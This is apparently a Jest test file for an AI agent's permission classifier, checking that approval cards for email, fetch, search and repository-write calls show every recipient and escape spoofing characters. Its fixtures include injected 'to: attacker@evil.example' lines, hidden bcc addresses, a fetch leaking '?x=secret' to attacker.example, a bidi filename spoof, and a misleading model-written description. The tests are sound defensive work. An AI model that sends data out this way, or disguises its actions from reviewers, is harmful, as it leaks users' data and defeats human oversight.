import {
  approvalCardForGatedCall,
  classifyTier,
  type ClassifyContext,
  type SentinelAction,
} from '../../../src/core/permissions/classifier';
import { defaultSentinelServices } from '../../../src/core/permissions/context';
import {
  extractCardFields,
  hostFromUrl,
  OUTBOUND_TEXT_MAX_CHARS,
  OUTBOUND_VALUE_MAX_CHARS,
  renderOutboundArguments,
} from '../../../src/core/permissions/extractorRegistry';
import type { Tier3Card, TierDecision } from '../../../src/core/permissions/tier';
import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';

function makeCtx(agentIntent: string | null = null): ClassifyContext {
  return {
    services: defaultSentinelServices({ pinned_path: '/usr/bin:/bin' }),
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: 'r1',
    workspace_cwd: null,
    agent_intent: agentIntent,
    web_search: createWebSearchTurnState(),
  };
}

function connectorCall(input: {
  tool_name: string;
  params: Record<string, unknown>;
  server_name?: string;
  server_host?: string | undefined;
  hints?: SentinelAction['mcp_hints'];
}): SentinelAction {
  return {
    tool_name: input.tool_name,
    canonical_params: input.params,
    tool_type: 'mcp',
    mcp_server_name: input.server_name ?? 'exa',
    mcp_server_host: 'server_host' in input ? input.server_host : 'mcp.exa.ai',
    mcp_hints: input.hints ?? {},
  };
}

function cardOf(decision: TierDecision): Tier3Card {
  if (decision.card === null) {
    throw new Error('expected an approval card');
  }
  return decision.card;
}

function rendered(params: Record<string, unknown>): { text: string; truncated: boolean } {
  const result = renderOutboundArguments(params);
  if (result.text === null) {
    throw new Error('expected rendered text');
  }
  return { text: result.text, truncated: result.truncated };
}

describe('renderOutboundArguments', () => {
  test('lists every argument, one line each, with a type hint on anything that is not a string', () => {
    expect(
      renderOutboundArguments({ query: 'best pizza', num_results: 5, filters: { site: 'a.com' }, tags: ['x', 'y'] }),
    ).toEqual({
      text: 'query: best pizza\nnum_results (number): 5\nfilters (object): {"site":"a.com"}\ntags (array): ["x","y"]',
      truncated: false,
    });
  });

  test('a string that looks like a number is told apart from a number', () => {
    expect(rendered({ amount: '5', count: 5, flag: true, none: null }).text).toBe(
      'amount: 5\ncount (number): 5\nflag (boolean): true\nnone (null): null',
    );
  });

  test('is null when there are no arguments', () => {
    expect(renderOutboundArguments({})).toEqual({ text: null, truncated: false });
  });

  test('a multi-line value cannot start a line that reads like another argument', () => {
    const { text } = rendered({ body: 'hello\nto: attacker@evil.example\nbcc: x', subject: 'hi' });
    expect(text).toBe('body: hello\n  | to: attacker@evil.example\n  | bcc: x\nsubject: hi');
    expect(text.split('\n').filter(line => /^[A-Za-z_]+(\s\(\w+\))?: /.test(line))).toEqual([
      'body: hello',
      'subject: hi',
    ]);
  });

  test('a key that is not plain is quoted and escaped so it cannot pass for a gutter or a line', () => {
    const { text } = rendered({ '  | to\nbcc': 'x' });
    expect(text).toBe('"  | to\\u{000A}bcc": x');
  });

  test('control, bidi and zero-width characters become visible tokens in values and keys', () => {
    const { text } = rendered({
      'k‮e': 'a‮b⁦c​d﻿e\u0007f\u0085g؜h⁠i‏j',
    });
    expect(text).toBe(
      '"k\\u{202E}e": a\\u{202E}b\\u{2066}c\\u{200B}d\\u{FEFF}e\\u{0007}f\\u{0085}g\\u{061C}h\\u{2060}i\\u{200F}j',
    );
    expect(text).not.toMatch(/[‮⁦​﻿\u0007\u0085؜⁠‏]/u);
  });

  test('CRLF counts as one newline and a lone carriage return is shown, not obeyed', () => {
    expect(rendered({ body: 'a\r\nb\rc' }).text).toBe('body: a\n  | b\\u{000D}c');
  });

  test('a value over the cap is cut with a marker, and every key still appears', () => {
    const result = rendered({ body: 'x'.repeat(OUTBOUND_VALUE_MAX_CHARS + 21), bcc: 'evil@x.example', subject: 's' });
    expect(result.truncated).toBe(true);
    expect(result.text).toContain('(21 more characters not shown)');
    expect(result.text).toContain('bcc: evil@x.example');
    expect(result.text).toContain('subject: s');
    expect(result.text.startsWith(`body: ${'x'.repeat(OUTBOUND_VALUE_MAX_CHARS)} ...`)).toBe(true);
  });

  test('a value exactly at the cap is not cut', () => {
    const value = 'y'.repeat(OUTBOUND_VALUE_MAX_CHARS);
    expect(renderOutboundArguments({ query: value })).toEqual({ text: `query: ${value}`, truncated: false });
  });

  test('the cut counts code points, so an emoji is never split', () => {
    const result = rendered({ note: '😀'.repeat(OUTBOUND_VALUE_MAX_CHARS + 1) });
    expect(result.text).toContain('(1 more characters not shown)');
    expect(result.text).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/);
  });

  test('recipient values are never cut, however long', () => {
    const emails = Array.from({ length: 400 }, (_, index) => `person${String(index)}@example.com`);
    const result = rendered({ bcc: emails, body: 'z'.repeat(OUTBOUND_VALUE_MAX_CHARS + 5) });
    for (const email of emails) {
      expect(result.text).toContain(email);
    }
    expect(result.truncated).toBe(true);
  });

  test('an overall cap shrinks values harder but never drops a key or a recipient', () => {
    const params: Record<string, unknown> = { bcc: 'evil@x.example' };
    for (let index = 0; index < 100; index += 1) {
      params[`field_${String(index)}`] = 'q'.repeat(OUTBOUND_VALUE_MAX_CHARS);
    }
    const result = rendered(params);
    expect(result.truncated).toBe(true);
    expect(result.text.length).toBeLessThan(OUTBOUND_TEXT_MAX_CHARS);
    expect(result.text).toContain('bcc: evil@x.example');
    for (let index = 0; index < 100; index += 1) {
      expect(result.text).toContain(`field_${String(index)}: `);
    }
  });
});

describe('recipients on the card', () => {
  const send = (params: Record<string, unknown>) =>
    classifyTier(connectorCall({ tool_name: 'send_email', params }), makeCtx());

  test('a bcc is on the Recipient row and a long body is shown in full', async () => {
    const card = cardOf(
      await send({ to: 'a@x.example', bcc: 'evil@x.example', body: 'x'.repeat(OUTBOUND_VALUE_MAX_CHARS * 3) }),
    );
    expect(card.recipient).toBe('a@x.example, evil@x.example');
    expect(card.outbound_text).toContain('bcc: evil@x.example');
    expect(card.outbound_text).toContain('x'.repeat(OUTBOUND_VALUE_MAX_CHARS * 3));
    expect(card.outbound_truncated).toBe(false);
  });

  test.each(['attendees', 'invitees', 'share_with', 'members', 'emails', 'webhook_url'])(
    '%s counts as a recipient key',
    async key => {
      const card = cardOf(await send({ [key]: ['p@x.example', 'q@x.example'] }));
      expect(card.recipient).toBe('p@x.example, q@x.example');
    },
  );

  test('objects such as [{ email }] are reduced to their address, all of them', async () => {
    const card = cardOf(
      await send({
        attendees: [{ email: 'a@x.example', name: 'A' }, { address: 'b@x.example' }, { mail: 'c@x.example' }],
      }),
    );
    expect(card.recipient).toBe('a@x.example, b@x.example, c@x.example');
  });

  test('a recipient nested inside another argument still reaches the Recipient row', async () => {
    const card = cardOf(
      await send({ to: 'a@x.example', message: { subject: 's', bcc: [{ email: 'deep@x.example' }] } }),
    );
    expect(card.recipient).toBe('a@x.example, deep@x.example');
  });

  test('spoofing characters in a destination are escaped on the card of a non-mail send', async () => {
    const card = cardOf(
      await classifyTier(
        connectorCall({
          tool_name: 'post_message',
          params: { to: 'a@x.example', url: 'https://x.example/\u200Bpath' },
        }),
        makeCtx(),
      ),
    );
    expect(card.destination).toBe('https://x.example/\\u{200B}path');
  });

  test('a recipient with spoofing characters is refused instead of carded', async () => {
    const decision = await send({ to: 'a@x.example\u202Egnp.exe' });
    expect(decision.card).toBeNull();
    expect(decision.auto_deny).toBe('incomplete_send_card');
  });
});

describe('hostFromUrl', () => {
  test('returns the host with its port for http and https URLs', () => {
    expect(hostFromUrl('https://mcp.exa.ai/mcp')).toBe('mcp.exa.ai');
    expect(hostFromUrl('http://localhost:8080/x')).toBe('localhost:8080');
  });

  test('is null for anything that is not an http URL', () => {
    expect(hostFromUrl('not a url')).toBeNull();
    expect(hostFromUrl('file:///etc/hosts')).toBeNull();
    expect(hostFromUrl('')).toBeNull();
  });
});

describe('connector card: web search', () => {
  test('a direct web_search names the tool, the host, and the exact query', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'web_search', params: { query: 'best pizza near me' } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('connector_outbound');
    expect(card.plain_what).toBe('Search the web on exa?');
    expect(card.plain_what).not.toMatch(/classifier|recognize/);
    expect(card.cannot_be_undone).toBe("Once this is sent, it can't be unsent.");
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('query: best pizza near me');
  });

  test('connectors that flag open-world still get the plain-words search card', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'tavily_search',
        server_name: 'tavily',
        server_host: 'mcp.tavily.com',
        params: { query: 'climate data', max_results: 3 },
        hints: { open_world_hint: true },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('mcp_open_world_hint');
    expect(card.plain_what).toBe('Search the web on tavily?');
    expect(card.destination_host).toBe('mcp.tavily.com');
    expect(card.outbound_text).toBe('query: climate data\nmax_results (number): 3');
  });

  test.each(['web_search_exa', 'webSearch', 'search_engine'])('%s is recognized as a search tool', async toolName => {
    const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
    expect(decision.reason).toBe('connector_outbound');
    expect(cardOf(decision).plain_what).toBe('Search the web on exa?');
    expect(cardOf(decision).plain_what).not.toContain(toolName);
  });

  test('a search tool that is not for the web says "a search", not "the web"', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'search_notes', params: { query: 'budget' } }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).toBe('Run a search on exa?');
  });

  test('names that merely contain the letters are not search tools', async () => {
    for (const toolName of ['research_notes', 'example_tool']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
      expect(decision.reason).toBe('unrecognized_tool');
    }
  });

  test('a long query is kept whole on the card for the UI to fold', async () => {
    const query = 'private '.repeat(200);
    const decision = await classifyTier(connectorCall({ tool_name: 'web_search', params: { query } }), makeCtx());
    expect(cardOf(decision).outbound_text).toBe(`query: ${query}`);
  });
});

describe('connector card: fetch, repository writes and mail', () => {
  test('a fetch shows the URL as destination, the connector host, and the arguments', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'web_fetch', params: { url: 'https://attacker.example/p.png?x=secret' } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(card.plain_what).toBe('Fetch a web page on exa?');
    expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
  });

  test('without a connector host there is no Sends to host, and a URL in the arguments never supplies one', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'fetch_url',
        server_host: undefined,
        params: { url: 'https://cdn.example.com/a.js' },
      }),
      makeCtx(),
    );
    expect(cardOf(decision).destination_host).toBeNull();
    expect(cardOf(decision).destination).toBe('https://cdn.example.com/a.js');
  });

  test('push_files names the repository and lists every file sent', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'push_files',
        server_name: 'github',
        server_host: 'api.githubcopilot.com',
        params: {
          owner: 'acme',
          repo: 'website',
          branch: 'main',
          files: [{ path: 'index.html', content: '<h1>hi</h1>' }],
        },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe('Write to repository acme/website on github?');
    expect(card.destination).toBe('acme/website');
    expect(card.destination_host).toBe('api.githubcopilot.com');
    expect(card.outbound_text).toContain('branch: main');
    expect(card.outbound_text).toContain('"path":"index.html"');
    expect(card.outbound_text).toContain('<h1>hi</h1>');
  });

  test('a gist is described as publishing', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'create_gist',
        server_name: 'github',
        params: { public: true, description: 'notes' },
      }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).toBe('Publish a gist on github?');
  });

  test('a delete is never described as a publish or a write', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'delete_gist', server_name: 'github', params: { gist_id: 'abc' } }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).not.toContain('Publish');
  });

  test('a Gmail send shows every recipient, the subject and the whole body', async () => {
    const body = `Hi Alice,\n${'details '.repeat(100)}`;
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'send_email',
        server_name: 'gmail',
        server_host: 'gmail.example.com',
        params: { to: ['alice@example.com'], cc: ['bob@example.com'], subject: 'Quarterly numbers', body },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe('Send an email to alice@example.com, bob@example.com?');
    expect(card.recipient).toBe('alice@example.com, bob@example.com');
    expect(card.destination_host).toBe('gmail.example.com');
    expect(card.outbound_text).toContain('subject: Quarterly numbers');
    expect(card.outbound_text).toContain(`body: Hi Alice,\n  | ${'details '.repeat(100)}`);
  });

  test.each([
    ['forward_email', 'Forward an email to carol@example.com?'],
    ['reply_to_thread', 'Send a reply to carol@example.com on gmail?'],
    ['draft_email', 'Save an email draft for carol@example.com?'],
  ])('%s is named in plain words with the recipient', async (toolName, expected) => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: toolName,
        server_name: 'gmail',
        params: { to: 'carol@example.com', subject: 'Hello', body: 'Hi' },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe(expected);
    expect(card.outbound_text).toContain('subject: Hello');
  });
});

describe('connector card: unknown tools stay fail-closed', () => {
  test('an unknown connector tool keeps the not-recognized card but shows what it sends', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'frobnicate', params: { target: 'https://api.example.com/data', n: 2 } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('unrecognized_tool');
    expect(card.plain_what).toBe('Allow this new tool from exa?');
    expect(card.destination).toBe('https://api.example.com/data');
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('target: https://api.example.com/data\nn (number): 2');
  });

  test('an unknown connector tool with no arguments has no outbound text', async () => {
    const decision = await classifyTier(connectorCall({ tool_name: 'frobnicate', params: {} }), makeCtx());
    expect(cardOf(decision).outbound_text).toBeNull();
  });

  test('a local connector without a server host shows no host', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'frobnicate', server_host: undefined, params: { id: '1' } }),
      makeCtx(),
    );
    expect(cardOf(decision).destination_host).toBeNull();
    expect(cardOf(decision).outbound_text).toBe('id: 1');
  });

  test('built-in tools never carry outbound fields', async () => {
    const decision = await classifyTier(
      {
        tool_name: 'frobnicate',
        canonical_params: { url: 'https://example.com' },
        tool_type: 'truefoundry-system',
        mcp_hints: {},
      },
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(card.outbound_text).toBeNull();
    expect(card.destination_host).toBeNull();
  });

  test('shell cards carry no outbound fields', async () => {
    const decision = await classifyTier(
      {
        tool_name: 'exec',
        canonical_params: { command: 'curl https://example.com' },
        tool_type: 'truefoundry-system',
        mcp_hints: {},
      },
      makeCtx(),
    );
    expect(decision.tier).toBe(3);
    expect(cardOf(decision).outbound_text).toBeNull();
    expect(cardOf(decision).destination_host).toBeNull();
  });
});

describe('connector card text comes from server-side params', () => {
  test('a model-written description or intent never becomes the card sentence', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'web_search',
        params: { query: 'salary of my neighbour', description: 'Harmless weather lookup' },
      }),
      makeCtx('Check the weather forecast.'),
    );
    const card = cardOf(decision);
    expect(card.plain_what).toBe('Search the web on exa?');
    expect(card.plain_what).not.toContain('weather');
    // The description is an argument that leaves the machine, so it is shown as one.
    expect(card.outbound_text).toBe('query: salary of my neighbour\ndescription: Harmless weather lookup');
  });
});

describe('connector card wording', () => {
  test('known connector sentences carry no markdown', async () => {
    for (const toolName of ['web_search', 'web_fetch', 'push_files', 'create_gist', 'search_notes']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
      expect(cardOf(decision).plain_what).not.toContain('`');
    }
  });

  test('there is no reason line when the agent gave none, and the stated reason is kept otherwise', async () => {
    const call = connectorCall({ tool_name: 'web_search', params: { query: 'q' } });
    expect(cardOf(await classifyTier(call, makeCtx())).plain_why).toBeNull();
    expect(cardOf(await classifyTier(call, makeCtx('   '))).plain_why).toBeNull();
    expect(cardOf(await classifyTier(call, makeCtx('Looking up the listing. More detail.'))).plain_why).toBe(
      'Looking up the listing.',
    );
  });
});

describe('connector card wording precedence', () => {
  test('an external-service name keeps its own sentence even when a family also matches', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'search_and_send_message', params: { to: 'a@x.example', query: 'q' } }),
      makeCtx(),
    );
    expect(decision.reason).toBe('external_service');
    expect(cardOf(decision).plain_what).toBe('Send a message to a@x.example?');
  });

  test('an external-service tool flagged open-world keeps the external-service sentence', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'forward_email',
        params: { to: 'a@x.example' },
        hints: { open_world_hint: true },
      }),
      makeCtx(),
    );
    // A send keeps its own reason under the hint, so no chat-wide answer covers it.
    expect(decision.reason).toBe('connector_send');
    expect(cardOf(decision).plain_what).toBe('Forward an email to a@x.example?');
  });

  test('a destructive hint on a family tool keeps the destructive sentence, not the family wording', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'web_search', params: { query: 'q' }, hints: { destructive_hint: true } }),
      makeCtx(),
    );
    expect(decision.reason).toBe('mcp_destructive_hint');
    expect(cardOf(decision).plain_what).toBe(
      'Run this action, even though it might change or delete something for good?',
    );
    expect(cardOf(decision).cannot_be_undone).toBe('This might change or delete something for good.');
  });
});

describe('card copy', () => {
  test.each([
    ['delete_note', "Once deleted, it's gone for good."],
    ['install_package', "Once this runs, it can't be undone."],
    ['frobnicate', 'This might change something for good.'],
  ])('%s explains itself in plain second person', async (toolName, expected) => {
    const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
    expect(cardOf(decision).cannot_be_undone).toBe(expected);
  });

  test('the run_code card keeps its short reassurance', async () => {
    const decision = await classifyTier(
      { tool_name: 'run_code', canonical_params: { code: 'print(1)' }, tool_type: 'truefoundry-system', mcp_hints: {} },
      makeCtx(),
    );
    expect(cardOf(decision).cannot_be_undone).toBe("Once this runs, it can't be undone.");
  });

  test('no card sentence uses an em dash or the old cold wording', async () => {
    const mapsCall = (tool_name: string, params: Record<string, unknown>): SentinelAction => ({
      tool_name,
      canonical_params: params,
      tool_type: 'truefoundry-system',
      mcp_server_name: 'maps',
      mcp_first_party: true,
      mcp_hints: {},
      maps_hosts: {
        geocoder: 'https://nominatim.openstreetmap.org',
        router: 'https://router.project-osrm.org',
        walking: 'https://routing.openstreetmap.de/routed-foot',
        cycling: 'https://routing.openstreetmap.de/routed-bike',
        transit: 'https://api.transitous.org/api/v6',
        tile: 'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
      },
    });
    const askingCtx = makeCtx();
    askingCtx.services = { ...askingCtx.services, searchWithoutAsking: () => Promise.resolve(false) };
    const designatedSearch: SentinelAction = {
      ...connectorCall({ tool_name: 'lookup', params: { query: 'q' }, hints: { read_only_hint: true } }),
      mcp_search_provider: true,
    };

    const decisions = await Promise.all([
      ...['delete_note', 'frobnicate', 'web_search', 'send_email'].map(name =>
        classifyTier(connectorCall({ tool_name: name, params: { to: 'a@x.example', query: 'q' } }), makeCtx()),
      ),
      classifyTier(mapsCall('render_map', { place_name: 'Paris' }), makeCtx()),
      classifyTier(mapsCall('render_route', { from_place: 'Madrid', to_place: 'Barcelona' }), makeCtx()),
      classifyTier(designatedSearch, askingCtx),
    ]);
    expect(decisions.map(decision => decision.reason)).toEqual(
      expect.arrayContaining(['maps_tool', 'mcp_search_setting_ask']),
    );
    for (const decision of decisions) {
      const card = cardOf(decision);
      expect(`${card.plain_what} ${card.cannot_be_undone ?? ''}`).not.toMatch(
        /\u2014|cannot be taken back|irreversible/,
      );
    }
    // Maps and search cards carry no reversibility note at all.
    for (const decision of decisions.slice(4)) {
      expect(cardOf(decision).cannot_be_undone).toBeNull();
    }
  });
});

describe('Parallel preset tools', () => {
  const parallel = (tool_name: string, params: Record<string, unknown>) =>
    connectorCall({ tool_name, params, server_name: 'parallel-web', server_host: 'search.parallel.ai' });

  test('web_fetch with a list of URLs gets plain fetch wording, never the unknown-tool sentence', async () => {
    const decision = await classifyTier(
      parallel('web_fetch', {
        urls: ['https://www.usps.com/manage/forward.htm', 'https://faq.usps.com/s/article/Change-of-Address'],
        objective: 'How to change an address',
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.reason).toBe('connector_outbound');
    expect(card.plain_what).toBe('Fetch a web page on parallel-web?');
    expect(card.destination_host).toBe('search.parallel.ai');
    expect(card.outbound_text).toContain('urls (array): ["https://www.usps.com/manage/forward.htm"');
    expect(card.outbound_text).toContain('objective: How to change an address');
  });

  test('web_search gets plain search wording', async () => {
    const decision = await classifyTier(
      parallel('web_search', { objective: 'USPS processing time', search_queries: ['usps change of address'] }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).toBe('Search the web on parallel-web?');
  });

  test.each(['web_fetch', 'web_search'])('%s keeps its wording when it carries no annotations at all', async name => {
    const decision = await classifyTier(parallel(name, { objective: 'o' }), makeCtx());
    expect(decision.tier).toBe(3);
    expect(cardOf(decision).plain_what).not.toMatch(/Aman doesn't know|classifier/);
  });
});

describe('card for a call that was gated some other way', () => {
  test('describes a connector call exactly as the classifier does, without minting anything', async () => {
    const action = connectorCall({ tool_name: 'web_fetch', params: { url: 'https://example.com/a' } });
    const gated = approvalCardForGatedCall({ action, agent_intent: null });
    expect(gated).toEqual(cardOf(await classifyTier(action, makeCtx())));
    expect(gated.plain_what).toBe('Fetch a web page on exa?');
  });

  test('an unknown tool is described plainly with its arguments', () => {
    const card = approvalCardForGatedCall({
      action: connectorCall({ tool_name: 'frobnicate', params: { id: '7' } }),
      agent_intent: null,
    });
    expect(card.plain_what).toBe('Allow this new tool from exa?');
    expect(card.outbound_text).toBe('id: 7');
  });
});

describe('connector card does not change the tier', () => {
  test('a family match and an unknown name both stay Tier 3 with an approval token', async () => {
    for (const toolName of ['web_search', 'frobnicate']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
      expect(decision.tier).toBe(3);
      expect(decision.auto_deny).toBeNull();
      expect(decision.approval_token_id).not.toBeNull();
    }
  });

  test('a read-only, closed-world search tool on a first-party connector still runs at Tier 1 with no card', async () => {
    const decision = await classifyTier(
      {
        ...connectorCall({
          tool_name: 'web_search',
          params: { query: 'q' },
          hints: { read_only_hint: true, open_world_hint: false },
        }),
        mcp_first_party: true,
      },
      makeCtx(),
    );
    expect(decision.tier).toBe(1);
    expect(decision.card).toBeNull();
  });

  test('extraction still reports external-service actions without a destination as unverifiable', () => {
    const result = extractCardFields({ tool_name: 'send_message', canonical_params: { text: 'hi' }, tool_type: 'mcp' });
    expect(result.external_service).toBe(true);
    expect(result.destination_unverifiable).toBe(true);
  });
});
